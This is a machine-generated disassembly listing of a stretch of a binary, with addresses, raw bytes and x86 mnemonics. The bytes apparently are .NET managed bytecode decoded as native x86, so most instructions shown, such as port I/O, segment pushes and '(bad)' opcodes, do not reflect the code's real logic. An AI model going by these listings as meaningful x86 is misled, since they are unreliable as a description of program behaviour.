  4046f2:	ed                   	in     (%dx),%eax
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 39                	or     (%ecx),%bh
  4046f7:	07                   	pop    %es
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	00 06                	add    %al,(%esi)
  4046fc:	0b dd                	or     %ebp,%ebx
  4046fe:	1c 00                	sbb    $0x0,%al
  404700:	00 00                	add    %al,(%eax)
  404702:	12 03                	adc    (%ebx),%al
  404704:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  40470a:	d1 dd                	rcr    $1,%ebp
  40470c:	0e                   	push   %cs
  40470d:	00 00                	add    %al,(%eax)
  40470f:	00 12                	add    %dl,(%edx)
  404711:	03 fe                	add    %esi,%edi
  404713:	16                   	push   %ss
  404714:	04 00                	add    $0x0,%al
  404716:	00 1b                	add    %bl,(%ebx)
  404718:	6f                   	outsl  %ds:(%esi),(%dx)
  404719:	33 00                	xor    (%eax),%eax
  40471b:	00 0a                	add    %cl,(%edx)
  40471d:	dc 07                	faddl  (%edi)
  40471f:	2a 01                	sub    (%ecx),%al
  404721:	10 00                	adc    %al,(%eax)
  404723:	00 02                	add    %al,(%edx)
  404725:	00 17                	add    %dl,(%edi)
  404727:	00 39                	add    %bh,(%ecx)
  404729:	50                   	push   %eax
  40472a:	00 0e                	add    %cl,(%esi)
  40472c:	00 00                	add    %al,(%eax)
  40472e:	00 00                	add    %al,(%eax)
  404730:	13 30                	adc    (%eax),%esi
  404732:	02 00                	add    (%eax),%al
  404734:	1e                   	push   %ds
  404735:	00 00                	add    %al,(%eax)
  404737:	00 01                	add    %al,(%ecx)
  404739:	00 00                	add    %al,(%eax)
  40473b:	11 02                	adc    %eax,(%edx)
  40473d:	03 28                	add    (%eax),%ebp
  40473f:	6d                   	insl   (%dx),%es:(%edi)
  404740:	00 00                	add    %al,(%eax)
  404742:	06                   	push   %es
  404743:	0a 06                	or     (%esi),%al
  404745:	15 40 02 00 00       	adc    $0x240,%eax
  40474a:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  40474d:	02 7b 38             	add    0x38(%ebx),%bh
  404750:	00 00                	add    %al,(%eax)
  404752:	04 06                	add    $0x6,%al
  404754:	6f                   	outsl  %ds:(%esi),(%dx)
  404755:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  40475c:	13 30                	adc    (%eax),%esi
  40475e:	04 00                	add    $0x0,%al
  404760:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  404765:	00 00                	add    %al,(%eax)
  404767:	11 02                	adc    %eax,(%edx)
  404769:	7b 38                	jnp    0x4047a3
  40476b:	00 00                	add    %al,(%eax)
  40476d:	04 6f                	add    $0x6f,%al
  40476f:	eb 00                	jmp    0x404771
  404771:	00 0a                	add    %cl,(%edx)
  404773:	0a 06                	or     (%esi),%al
  404775:	1f                   	pop    %ds
  404776:	0f 3d                	(bad)
  404778:	16                   	push   %ss
  404779:	00 00                	add    %al,(%eax)
  40477b:	00 20                	add    %ah,(%eax)
  40477d:	80 00 00             	addb   $0x0,(%eax)
  404780:	00 06                	add    %al,(%esi)
  404782:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404785:	0b 03                	or     (%ebx),%eax
  404787:	07                   	pop    %es
  404788:	6f                   	outsl  %ds:(%esi),(%dx)
  404789:	ee                   	out    %al,(%dx)
  40478a:	00 00                	add    %al,(%eax)
  40478c:	0a 38                	or     (%eax),%bh
  40478e:	59                   	pop    %ecx
  40478f:	00 00                	add    %al,(%eax)
  404791:	00 06                	add    %al,(%esi)
  404793:	20 ff                	and    %bh,%bh
  404795:	ff 00                	incl   (%eax)
  404797:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40479d:	20 de                	and    %bl,%dh
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	00 0b                	add    %cl,(%ebx)
  4047a3:	03 07                	add    (%edi),%eax
  4047a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a6:	ee                   	out    %al,(%dx)
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	0a 06                	or     (%esi),%al
  4047ab:	68 28 ef 00 00       	push   $0xef28
  4047b0:	0a 28                	or     (%eax),%ch
  4047b2:	58                   	pop    %eax
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	06                   	push   %es
  4047b6:	0c 03                	or     $0x3,%al
  4047b8:	08 16                	or     %dl,(%esi)
  4047ba:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c0:	00 0a                	add    %cl,(%edx)
  4047c2:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	20 df                	and    %bl,%bh
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	00 0b                	add    %cl,(%ebx)
  4047cd:	03 07                	add    (%edi),%eax
  4047cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d0:	ee                   	out    %al,(%dx)
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	0a 06                	or     (%esi),%al
  4047d5:	28 4a 00             	sub    %cl,0x0(%edx)
  4047d8:	00 0a                	add    %cl,(%edx)
  4047da:	28 58 00             	sub    %bl,0x0(%eax)
  4047dd:	00 06                	add    %al,(%esi)
  4047df:	0c 03                	or     $0x3,%al
  4047e1:	08 16                	or     %dl,(%esi)
  4047e3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047e9:	00 0a                	add    %cl,(%edx)
  4047eb:	16                   	push   %ss
  4047ec:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f1:	00 03                	add    %al,(%ebx)
  4047f3:	02 7b 38             	add    0x38(%ebx),%bh
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	04 09                	add    $0x9,%al
  4047fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047fb:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  404802:	00 04 28             	add    %al,(%eax,%ebp,1)
  404805:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 09                	add    $0x9,%al
  404810:	6f                   	outsl  %ds:(%esi),(%dx)
  404811:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404818:	00 00                	add    %al,(%eax)
  40481a:	06                   	push   %es
  40481b:	09 17                	or     %edx,(%edi)
  40481d:	58                   	pop    %eax
  40481e:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  404823:	2a 13                	sub    (%ebx),%dl
  404825:	30 04 00             	xor    %al,(%eax,%eax,1)
  404828:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 1f                	add    %bl,(%edi)
  40482d:	00 00                	add    %al,(%eax)
  40482f:	11 02                	adc    %eax,(%edx)
  404831:	7b 38                	jnp    0x40486b
  404833:	00 00                	add    %al,(%eax)
  404835:	04 6f                	add    $0x6f,%al
  404837:	eb 00                	jmp    0x404839
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	0a 06                	or     (%esi),%al
  40483d:	1f                   	pop    %ds
  40483e:	0f 3d                	(bad)
  404840:	16                   	push   %ss
  404841:	00 00                	add    %al,(%eax)
  404843:	00 20                	add    %ah,(%eax)
  404845:	90                   	nop
  404846:	00 00                	add    %al,(%eax)
  404848:	00 06                	add    %al,(%esi)
  40484a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40484d:	0b 03                	or     (%ebx),%eax
  40484f:	07                   	pop    %es
  404850:	6f                   	outsl  %ds:(%esi),(%dx)
  404851:	ee                   	out    %al,(%dx)
  404852:	00 00                	add    %al,(%eax)
  404854:	0a 38                	or     (%eax),%bh
  404856:	59                   	pop    %ecx
  404857:	00 00                	add    %al,(%eax)
  404859:	00 06                	add    %al,(%esi)
  40485b:	20 ff                	and    %bh,%bh
  40485d:	ff 00                	incl   (%eax)
  40485f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  404865:	20 dc                	and    %bl,%ah
  404867:	00 00                	add    %al,(%eax)
  404869:	00 0b                	add    %cl,(%ebx)
  40486b:	03 07                	add    (%edi),%eax
  40486d:	6f                   	outsl  %ds:(%esi),(%dx)
  40486e:	ee                   	out    %al,(%dx)
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a 06                	or     (%esi),%al
  404873:	68 28 ef 00 00       	push   $0xef28
  404878:	0a 28                	or     (%eax),%ch
  40487a:	58                   	pop    %eax
  40487b:	00 00                	add    %al,(%eax)
  40487d:	06                   	push   %es
  40487e:	0c 03                	or     $0x3,%al
  404880:	08 16                	or     %dl,(%esi)
  404882:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404888:	00 0a                	add    %cl,(%edx)
  40488a:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  40488d:	00 00                	add    %al,(%eax)
  40488f:	20 dd                	and    %bl,%ch
  404891:	00 00                	add    %al,(%eax)
  404893:	00 0b                	add    %cl,(%ebx)
  404895:	03 07                	add    (%edi),%eax
  404897:	6f                   	outsl  %ds:(%esi),(%dx)
  404898:	ee                   	out    %al,(%dx)
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 06                	or     (%esi),%al
  40489d:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a0:	00 0a                	add    %cl,(%edx)
  4048a2:	28 58 00             	sub    %bl,0x0(%eax)
  4048a5:	00 06                	add    %al,(%esi)
  4048a7:	0c 03                	or     $0x3,%al
  4048a9:	08 16                	or     %dl,(%esi)
  4048ab:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	16                   	push   %ss
  4048b4:	0d 38 16 00 00       	or     $0x1638,%eax
  4048b9:	00 02                	add    %al,(%edx)
  4048bb:	7b 38                	jnp    0x4048f5
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	04 09                	add    $0x9,%al
  4048c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4048c2:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	06                   	push   %es
  4048cc:	09 17                	or     %edx,(%edi)
  4048ce:	58                   	pop    %eax
  4048cf:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048d4:	2a 00                	sub    (%eax),%al
  4048d6:	00 00                	add    %al,(%eax)
  4048d8:	13 30                	adc    (%eax),%esi
  4048da:	02 00                	add    (%eax),%al
  4048dc:	99                   	cltd
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	00 20                	add    %ah,(%eax)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	11 02                	adc    %eax,(%edx)
  4048e5:	7b 36                	jnp    0x40491d
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	04 0a                	add    $0xa,%al
  4048eb:	06                   	push   %es
  4048ec:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048ef:	07                   	pop    %es
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	00 22                	add    %ah,(%edx)
  4048f4:	00 00                	add    %al,(%eax)
  4048f6:	00 05 00 00 00 16    	add    %al,0x16000000
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 6b 00             	add    %ch,0x0(%ebx)
  404901:	00 00                	add    %al,(%eax)
  404903:	38 00                	cmp    %al,(%eax)
  404905:	00 00                	add    %al,(%eax)
  404907:	49                   	dec    %ecx
  404908:	00 00                	add    %al,(%eax)
  40490a:	00 5a 00             	add    %bl,0x0(%edx)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	38 66 00             	cmp    %ah,0x0(%esi)
  404912:	00 00                	add    %al,(%eax)
  404914:	02 7b 35             	add    0x35(%ebx),%bh
  404917:	00 00                	add    %al,(%eax)
  404919:	04 a5                	add    $0xa5,%al
  40491b:	68 00 00 01 28       	push   $0x28010000
  404920:	f0 00 00             	lock add %al,(%eax)
  404923:	0a 2a                	or     (%edx),%ch
  404925:	02 7b 35             	add    0x35(%ebx),%bh
  404928:	00 00                	add    %al,(%eax)
  40492a:	04 a5                	add    $0xa5,%al
  40492c:	95                   	xchg   %eax,%ebp
  40492d:	00 00                	add    %al,(%eax)
  40492f:	01 2a                	add    %ebp,(%edx)
  404931:	02 7b 35             	add    0x35(%ebx),%bh
  404934:	00 00                	add    %al,(%eax)
  404936:	04 6f                	add    $0x6f,%al
  404938:	38 00                	cmp    %al,(%eax)
  40493a:	00 0a                	add    %cl,(%edx)
  40493c:	6f                   	outsl  %ds:(%esi),(%dx)
  40493d:	f1                   	int1
  40493e:	00 00                	add    %al,(%eax)
  404940:	0a 28                	or     (%eax),%ch
  404942:	f2 00 00             	repnz add %al,(%eax)
  404945:	0a 2a                	or     (%edx),%ch
  404947:	02 7b 35             	add    0x35(%ebx),%bh
  40494a:	00 00                	add    %al,(%eax)
  40494c:	04 a5                	add    $0xa5,%al
  40494e:	96                   	xchg   %eax,%esi
  40494f:	00 00                	add    %al,(%eax)
  404951:	01 28                	add    %ebp,(%eax)
  404953:	f3 00 00             	repz add %al,(%eax)
  404956:	0a 2a                	or     (%edx),%ch
  404958:	02 7b 35             	add    0x35(%ebx),%bh
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 a5                	add    $0xa5,%al
  40495f:	97                   	xchg   %eax,%edi
  404960:	00 00                	add    %al,(%eax)
  404962:	01 28                	add    %ebp,(%eax)
  404964:	f4                   	hlt
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 2a                	or     (%edx),%ch
  404969:	02 7b 35             	add    0x35(%ebx),%bh
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 a5                	add    $0xa5,%al
  404970:	6b 00 00             	imul   $0x0,(%eax),%eax
  404973:	01 28                	add    %ebp,(%eax)
  404975:	f5                   	cmc
  404976:	00 00                	add    %al,(%eax)
  404978:	0a 2a                	or     (%edx),%ch
  40497a:	16                   	push   %ss
  40497b:	6a 2a                	push   $0x2a
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 13                	add    %dl,(%ebx)
  404981:	30 02                	xor    %al,(%edx)
  404983:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404989:	00 00                	add    %al,(%eax)
  40498b:	11 02                	adc    %eax,(%edx)
  40498d:	7b 36                	jnp    0x4049c5
  40498f:	00 00                	add    %al,(%eax)
  404991:	04 0a                	add    $0xa,%al
  404993:	06                   	push   %es
  404994:	1a 59 45             	sbb    0x45(%ecx),%bl
  404997:	07                   	pop    %es
  404998:	00 00                	add    %al,(%eax)
  40499a:	00 22                	add    %ah,(%edx)
  40499c:	00 00                	add    %al,(%eax)
  40499e:	00 05 00 00 00 11    	add    %al,0x11000000
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 6b 00             	add    %ch,0x0(%ebx)
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	38 00                	cmp    %al,(%eax)
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	49                   	dec    %ecx
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	00 5a 00             	add    %bl,0x0(%edx)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	38 66 00             	cmp    %ah,0x0(%esi)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	02 7b 35             	add    0x35(%ebx),%bh
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	04 a5                	add    $0xa5,%al
  4049c3:	68 00 00 01 2a       	push   $0x2a010000
  4049c8:	02 7b 35             	add    0x35(%ebx),%bh
  4049cb:	00 00                	add    %al,(%eax)
  4049cd:	04 a5                	add    $0xa5,%al
  4049cf:	68 00 00 01 28       	push   $0x28010000
  4049d4:	f6 00 00             	testb  $0x0,(%eax)
  4049d7:	0a 2a                	or     (%edx),%ch
  4049d9:	02 7b 35             	add    0x35(%ebx),%bh
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	04 6f                	add    $0x6f,%al
  4049e0:	38 00                	cmp    %al,(%eax)
  4049e2:	00 0a                	add    %cl,(%edx)
  4049e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e5:	f1                   	int1
  4049e6:	00 00                	add    %al,(%eax)
  4049e8:	0a 28                	or     (%eax),%ch
  4049ea:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f0:	7b 35                	jnp    0x404a27
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 a5                	add    $0xa5,%al
  4049f6:	96                   	xchg   %eax,%esi
  4049f7:	00 00                	add    %al,(%eax)
  4049f9:	01 28                	add    %ebp,(%eax)
  4049fb:	f8                   	clc
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	0a 2a                	or     (%edx),%ch
  404a00:	02 7b 35             	add    0x35(%ebx),%bh
  404a03:	00 00                	add    %al,(%eax)
  404a05:	04 a5                	add    $0xa5,%al
  404a07:	97                   	xchg   %eax,%edi
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	01 28                	add    %ebp,(%eax)
  404a0c:	f9                   	stc
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	0a 2a                	or     (%edx),%ch
  404a11:	02 7b 35             	add    0x35(%ebx),%bh
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 a5                	add    $0xa5,%al
  404a18:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a1b:	01 28                	add    %ebp,(%eax)
  404a1d:	fa                   	cli
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	0a 2a                	or     (%edx),%ch
  404a22:	16                   	push   %ss
  404a23:	6a 2a                	push   $0x2a
  404a25:	00 00                	add    %al,(%eax)
  404a27:	00 13                	add    %dl,(%ebx)
  404a29:	30 02                	xor    %al,(%edx)
  404a2b:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a31:	00 00                	add    %al,(%eax)
  404a33:	11 02                	adc    %eax,(%edx)
  404a35:	7b 36                	jnp    0x404a6d
  404a37:	00 00                	add    %al,(%eax)
  404a39:	04 0a                	add    $0xa,%al
  404a3b:	06                   	push   %es
  404a3c:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a3f:	07                   	pop    %es
  404a40:	00 00                	add    %al,(%eax)
  404a42:	00 16                	add    %dl,(%esi)
  404a44:	00 00                	add    %al,(%eax)
  404a46:	00 05 00 00 00 52    	add    %al,0x52000000
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 52 00             	add    %dl,0x0(%edx)
  404a51:	00 00                	add    %al,(%eax)
  404a53:	27                   	daa
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 33                	add    %dh,(%ebx)
  404a58:	00 00                	add    %al,(%eax)
  404a5a:	00 40 00             	add    %al,0x0(%eax)
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a62:	00 00                	add    %al,(%eax)
  404a64:	02 7b 35             	add    0x35(%ebx),%bh
  404a67:	00 00                	add    %al,(%eax)
  404a69:	04 a5                	add    $0xa5,%al
  404a6b:	68 00 00 01 28       	push   $0x28010000
  404a70:	fb                   	sti
  404a71:	00 00                	add    %al,(%eax)
  404a73:	0a 2a                	or     (%edx),%ch
  404a75:	02 7b 35             	add    0x35(%ebx),%bh
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	04 74                	add    $0x74,%al
  404a7c:	38 00                	cmp    %al,(%eax)
  404a7e:	00 01                	add    %al,(%ecx)
  404a80:	28 fc                	sub    %bh,%ah
  404a82:	00 00                	add    %al,(%eax)
  404a84:	0a 2a                	or     (%edx),%ch
  404a86:	02 7b 35             	add    0x35(%ebx),%bh
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 a5                	add    $0xa5,%al
  404a8d:	96                   	xchg   %eax,%esi
  404a8e:	00 00                	add    %al,(%eax)
  404a90:	01 2a                	add    %ebp,(%edx)
  404a92:	02 7b 35             	add    0x35(%ebx),%bh
  404a95:	00 00                	add    %al,(%eax)
  404a97:	04 a5                	add    $0xa5,%al
  404a99:	97                   	xchg   %eax,%edi
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa0:	7b 35                	jnp    0x404ad7
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	04 a5                	add    $0xa5,%al
  404aa6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404aa9:	01 28                	add    %ebp,(%eax)
  404aab:	fa                   	cli
  404aac:	00 00                	add    %al,(%eax)
  404aae:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404aba:	2a 00                	sub    (%eax),%al
  404abc:	13 30                	adc    (%eax),%esi
  404abe:	02 00                	add    (%eax),%al
  404ac0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	00 21                	add    %ah,(%ecx)
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	11 02                	adc    %eax,(%edx)
  404ac9:	7b 36                	jnp    0x404b01
  404acb:	00 00                	add    %al,(%eax)
  404acd:	04 0a                	add    $0xa,%al
  404acf:	06                   	push   %es
  404ad0:	1a 59 45             	sbb    0x45(%ecx),%bl
  404ad3:	08 00                	or     %al,(%eax)
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	16                   	push   %ss
  404ad8:	00 00                	add    %al,(%eax)
  404ada:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 6e 00             	add    %ch,0x0(%esi)
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	27                   	daa
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 38                	add    %bh,(%eax)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	00 49 00             	add    %cl,0x0(%ecx)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	62 00                	bound  %eax,(%eax)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	38 69 00             	cmp    %ch,0x0(%ecx)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	02 7b 35             	add    0x35(%ebx),%bh
  404aff:	00 00                	add    %al,(%eax)
  404b01:	04 a5                	add    $0xa5,%al
  404b03:	68 00 00 01 28       	push   $0x28010000
  404b08:	e7 00                	out    %eax,$0x0
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	2a 02                	sub    (%edx),%al
  404b0e:	7b 35                	jnp    0x404b45
  404b10:	00 00                	add    %al,(%eax)
  404b12:	04 6f                	add    $0x6f,%al
  404b14:	38 00                	cmp    %al,(%eax)
  404b16:	00 0a                	add    %cl,(%edx)
  404b18:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b1c:	06                   	push   %es
  404b1d:	2a 02                	sub    (%edx),%al
  404b1f:	7b 35                	jnp    0x404b56
  404b21:	00 00                	add    %al,(%eax)
  404b23:	04 a5                	add    $0xa5,%al
  404b25:	96                   	xchg   %eax,%esi
  404b26:	00 00                	add    %al,(%eax)
  404b28:	01 28                	add    %ebp,(%eax)
  404b2a:	e8 00 00 0a 2a       	call   0x2a4a4b2f
  404b2f:	02 7b 35             	add    0x35(%ebx),%bh
  404b32:	00 00                	add    %al,(%eax)
  404b34:	04 a5                	add    $0xa5,%al
  404b36:	97                   	xchg   %eax,%edi
  404b37:	00 00                	add    %al,(%eax)
  404b39:	01 28                	add    %ebp,(%eax)
  404b3b:	fd                   	std
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	0a 2a                	or     (%edx),%ch
  404b40:	02 7b 35             	add    0x35(%ebx),%bh
  404b43:	00 00                	add    %al,(%eax)
  404b45:	04 a5                	add    $0xa5,%al
  404b47:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b4a:	01 0b                	add    %ecx,(%ebx)
  404b4c:	12 01                	adc    (%ecx),%al
  404b4e:	28 fe                	sub    %bh,%dh
  404b50:	00 00                	add    %al,(%eax)
  404b52:	0a 28                	or     (%eax),%ch
  404b54:	e7 00                	out    %eax,$0x0
  404b56:	00 0a                	add    %cl,(%edx)
  404b58:	2a 02                	sub    (%edx),%al
  404b5a:	7b 35                	jnp    0x404b91
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	04 74                	add    $0x74,%al
  404b60:	02 00                	add    (%eax),%al
  404b62:	00 1b                	add    %bl,(%ebx)
  404b64:	2a 16                	sub    (%esi),%dl
  404b66:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b6a:	01 2a                	add    %ebp,(%edx)
  404b6c:	13 30                	adc    (%eax),%esi
  404b6e:	04 00                	add    $0x0,%al
  404b70:	4b                   	dec    %ebx
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 22                	add    %ah,(%edx)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 03                	adc    %eax,(%ebx)
  404b79:	28 6a 00             	sub    %ch,0x0(%edx)
  404b7c:	00 0a                	add    %cl,(%edx)
  404b7e:	39 3e                	cmp    %edi,(%esi)
  404b80:	00 00                	add    %al,(%eax)
  404b82:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b85:	03 19                	add    (%ecx),%ebx
  404b87:	17                   	pop    %ss
  404b88:	17                   	pop    %ss
  404b89:	73 ff                	jae    0x404b8a
  404b8b:	00 00                	add    %al,(%eax)
  404b8d:	0a 0b                	or     (%ebx),%cl
  404b8f:	07                   	pop    %es
  404b90:	6f                   	outsl  %ds:(%esi),(%dx)
  404b91:	e2 00                	loop   0x404b93
  404b93:	00 0a                	add    %cl,(%edx)
  404b95:	d4 8d                	aam    $0x8d
  404b97:	44                   	inc    %esp
  404b98:	00 00                	add    %al,(%eax)
  404b9a:	01 0a                	add    %ecx,(%edx)
  404b9c:	07                   	pop    %es
  404b9d:	06                   	push   %es
  404b9e:	16                   	push   %ss
  404b9f:	07                   	pop    %es
  404ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba1:	e2 00                	loop   0x404ba3
  404ba3:	00 0a                	add    %cl,(%edx)
  404ba5:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bac:	07                   	pop    %es
  404bad:	6f                   	outsl  %ds:(%esi),(%dx)
  404bae:	9f                   	lahf
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	0a 07                	or     (%edi),%al
  404bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb4:	40                   	inc    %eax
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	0a 02                	or     (%edx),%al
  404bb9:	06                   	push   %es
  404bba:	28 79 00             	sub    %bh,0x0(%ecx)
  404bbd:	00 06                	add    %al,(%esi)
  404bbf:	17                   	pop    %ss
  404bc0:	2a 16                	sub    (%esi),%dl
  404bc2:	2a 00                	sub    (%eax),%al
  404bc4:	13 30                	adc    (%eax),%esi
  404bc6:	05 00 40 00 00       	add    $0x4000,%eax
  404bcb:	00 00                	add    %al,(%eax)
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 02                	add    %al,(%edx)
  404bd1:	7b 35                	jnp    0x404c08
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	04 39                	add    $0x39,%al
  404bd7:	33 00                	xor    (%eax),%eax
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404bde:	6c                   	insb   (%dx),%es:(%edi)
  404bdf:	00 00                	add    %al,(%eax)
  404be1:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404be7:	00 04 74             	add    %al,(%esp,%esi,2)
  404bea:	02 00                	add    (%eax),%al
  404bec:	00 1b                	add    %bl,(%ebx)
  404bee:	16                   	push   %ss
  404bef:	02 7b 35             	add    0x35(%ebx),%bh
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	04 74                	add    $0x74,%al
  404bf6:	02 00                	add    (%eax),%al
  404bf8:	00 1b                	add    %bl,(%ebx)
  404bfa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404bfd:	4c                   	dec    %esp
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c06:	0a 6f 40             	or     0x40(%edi),%ch
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	0a 17                	or     (%edi),%dl
  404c0d:	2a 16                	sub    (%esi),%dl
  404c0f:	2a 13                	sub    (%ebx),%dl
  404c11:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c14:	af                   	scas   %es:(%edi),%eax
  404c15:	00 00                	add    %al,(%eax)
  404c17:	00 23                	add    %ah,(%ebx)
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	11 02                	adc    %eax,(%edx)
  404c1d:	0a 03                	or     (%ebx),%al
  404c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c20:	f1                   	int1
  404c21:	00 00                	add    %al,(%eax)
  404c23:	0a 19                	or     (%ecx),%bl
  404c25:	8d 39                	lea    (%ecx),%edi
  404c27:	00 00                	add    %al,(%eax)
  404c29:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c2f:	04 28                	add    $0x28,%al
  404c31:	e4 00                	in     $0x0,%al
  404c33:	00 0a                	add    %cl,(%edx)
  404c35:	6f                   	outsl  %ds:(%esi),(%dx)
  404c36:	26 00 00             	add    %al,%es:(%eax)
  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
  404c40:	02 00                	add    (%eax),%al
  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
